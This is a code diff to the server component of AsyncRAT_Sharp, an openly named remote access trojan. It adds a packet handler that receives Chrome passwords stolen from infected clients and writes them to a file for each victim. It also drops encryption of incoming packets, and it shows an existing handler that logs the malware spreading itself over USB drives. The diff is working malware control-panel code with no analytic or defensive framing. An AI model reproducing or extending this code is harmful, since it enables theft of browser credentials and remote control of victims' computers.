@@ -5,6 +5,8 @@ using System.Diagnostics;
 using System.Drawing;
 using AsyncRAT_Sharp.Forms;
 using System.Security.Cryptography;
+using System.IO;
+using System.Windows.Forms;
 
 namespace AsyncRAT_Sharp.Handle_Packet
 {
@@ -19,7 +21,7 @@ namespace AsyncRAT_Sharp.Handle_Packet
                 byte[] data = (byte[])array[0];
                 client = (Clients)array[1];
                 MsgPack unpack_msgpack = new MsgPack();
-                unpack_msgpack.DecodeFromBytes(Settings.AES.Decrypt(data));
+                unpack_msgpack.DecodeFromBytes(data);
                 switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                 {
                     case "ClientInfo":
@@ -55,6 +57,15 @@ namespace AsyncRAT_Sharp.Handle_Packet
                     case "usbSpread":
                         {
                             new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} found {unpack_msgpack.ForcePathObject("Count").AsString} USB drivers and spreaded them successfully", Color.Purple);
+                            break;
+                        }
+
+                    case "recoveryPassword":
+                        {
+                            if (!Directory.Exists(Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.ID)))
+                                Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.ID));
+                            File.WriteAllText(Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.ID + "\\ChromePassowrds.txt"), unpack_msgpack.ForcePathObject("Password").AsString);
+                            new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} recovered passwords successfully", Color.Purple);
                             break;
                         }
 
@@ -99,7 +110,7 @@ namespace AsyncRAT_Sharp.Handle_Packet
             catch (CryptographicException)
             {
                 new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} tried to connect with wrong password", Color.Red);
-              //  Settings.Blocked.Add(client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]);
+                //  Settings.Blocked.Add(client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]);
                 client.Disconnected();
                 return;
             }
